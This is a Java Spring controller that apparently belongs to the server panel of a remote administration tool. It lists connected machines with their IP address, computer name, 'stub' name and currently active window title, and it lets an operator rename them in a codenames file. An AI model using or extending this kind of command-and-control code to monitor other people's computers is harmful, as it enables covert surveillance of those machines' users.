package com.github.jafarlihi.controller;

import com.github.jafarlihi.service.ClientListenerService;
import com.github.jafarlihi.util.Client;
import org.json.JSONArray;
import org.json.JSONObject;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.time.Duration;
import java.time.LocalDateTime;
import java.util.Map;
import java.util.Scanner;

@RestController
public class ClientController {

    @GetMapping("/client")
    public String getClients() {
        JSONArray result = new JSONArray();
        for (Map.Entry<String, Client> client : ClientListenerService.clients.entrySet()) {
            if (Duration.between(client.getValue().lastSeen, LocalDateTime.now()).getSeconds() > 10)
                continue;
            JSONObject clientObject = new JSONObject();
            clientObject.put("name", client.getKey());
            clientObject.put("address", ((InetSocketAddress) client.getValue().socket.getRemoteSocketAddress()).getAddress());
            clientObject.put("computerName", client.getValue().computerName);
            clientObject.put("stubName", client.getValue().stubName);
            clientObject.put("activeWindowTitle", client.getValue().activeWindowTitle);
            result.put(clientObject);
        }
        return result.toString();
    }

    @PostMapping("/client")
    public ResponseEntity<String> changeClientName(@RequestBody String body) {
        JSONObject request = new JSONObject(body);
        Client client = ClientListenerService.clients.get(request.getString("client"));
        if (client == null)
            return new ResponseEntity<>(HttpStatus.NOT_FOUND);
        String newName = request.getString("newName");
        if (newName.contains(" "))
            return new ResponseEntity<>("New name can't contain spaces", HttpStatus.BAD_REQUEST);
        ClientListenerService.clients.remove(request.getString("client"));
        ClientListenerService.clients.put(newName, client);
        String filePath = "codenames.json";
        try {
            Scanner sc = new Scanner(new File(filePath));
            StringBuilder buffer = new StringBuilder();
            while (sc.hasNextLine())
                buffer.append(sc.nextLine() + System.lineSeparator());
            String fileContents = buffer.toString();
            sc.close();
            fileContents = fileContents.replace("\"" + request.getString("client") + "\"", "\"" + newName + "\"");
            FileWriter writer = new FileWriter(filePath);
            writer.append(fileContents);
            writer.flush();
        } catch (IOException ex) {
            return new ResponseEntity<>(ex.toString(), HttpStatus.INTERNAL_SERVER_ERROR);
        }
        return new ResponseEntity<>(HttpStatus.OK);
    }
}
